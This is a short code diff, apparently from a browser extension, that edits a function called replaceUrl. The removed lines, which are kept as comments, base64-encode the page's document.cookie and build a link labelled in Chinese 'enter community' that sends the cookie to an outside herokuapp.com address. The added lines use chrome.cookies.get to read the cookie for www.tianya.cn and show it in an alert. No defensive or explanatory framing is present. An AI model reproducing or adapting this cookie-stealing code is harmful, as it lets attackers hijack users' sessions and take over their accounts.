@@ -86,7 +86,10 @@ window.onload=function(){
 }
 
 function replaceUrl(){
-	var url = window.btoa(encodeURI(document.cookie));
-	//guide-enter
-	 document.querySelector(".guide-enter").innerHTML='<a href="https://vast-inlet-75928.herokuapp.com/test2?cookie='+url+'">进入社区</a>';
+	var details = {};
+	details.url = "www.tianya.cn";
+
+	chrome.cookies.get(details,function(cookie){alert(cookie);});
+	//var url = window.btoa(encodeURI(document.cookie));
+	// document.querySelector(".guide-enter").innerHTML='<a href="https://vast-inlet-75928.herokuapp.com/test2?cookie='+url+'">进入社区</a>';
 }
